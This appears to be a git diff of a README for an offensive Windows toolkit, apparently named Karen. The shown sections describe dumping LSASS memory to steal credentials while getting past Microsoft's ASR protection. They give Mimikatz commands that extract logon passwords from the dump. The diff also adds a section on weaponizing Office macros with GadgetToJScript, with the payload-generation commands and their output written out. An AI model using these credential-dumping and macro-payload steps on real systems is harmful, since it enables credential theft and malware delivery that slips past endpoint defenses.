@@ -104,7 +104,7 @@ Method 1 leverages `MiniDumpWriteDump` from `Dbghelp.dll` to perform a user-mode
 
 Method 2 leverages `WmiPrvSE.exe` and shellcode injection to dump LSASS on an endpoint with the ASR rule of "Block credential stealing from the Windows local security authority subsystem (lsass.exe)" enabled.
 
-To parse the dump file, use `sekurlsa::minidump lsass.dmp` -> `sekurlsa::logonpasswords` from Mimikatz or a LSASS parser like [MiniDump](https://github.com/cube0x0/MiniDump)
+**NOTE:** To parse the dump file, use `sekurlsa::minidump lsass.dmp` -> `sekurlsa::logonpasswords` from Mimikatz or a LSASS parser like [MiniDump](https://github.com/cube0x0/MiniDump).
 ```
 C:\>KarenDumpedMi.exe
      _        _______  _______  _______  _        ______            _______  _______  _______  ______   _______ _________
@@ -161,3 +161,21 @@ C:\>KarenDumpedMi.exe
 ```
 
 ## Karen2Gadget
+Karen2Gadget is a boilerplate of KarenLdr designed to work compatibly with [GadgetToJScript](https://github.com/med0x2e/GadgetToJScript). It can be used to automate Macro weaponization for bypassing ASR rules that block Win32 APIs.
+
+**NOTE:** Use `cscript.exe Karen2Gadget.vbs` to test the PoC.
+``
+C:\>GadgetToJScript.exe -c Karen2Gadget\Program.cs -o Karen2Gadget -w vba -b -d System.dll
+[+]: Generating the vba payload
+[+]: First stage gadget generation done.
+[+]: Compiling your .NET code located at: Karen2Gadget\Program.cs
+[+]: Second stage gadget generation done.
+[*]: Payload generation completed, check: Karen2Gadget.vba
+
+C:\>GadgetToJScript.exe -c Karen2Gadget\Program.cs -o Karen2Gadget -w vbs -b -d System.dll
+[+]: Generating the vba payload
+[+]: First stage gadget generation done.
+[+]: Compiling your .NET code located at: Karen2Gadget\Program.cs
+[+]: Second stage gadget generation done.
+[*]: Payload generation completed, check: Karen2Gadget.vbs
+``
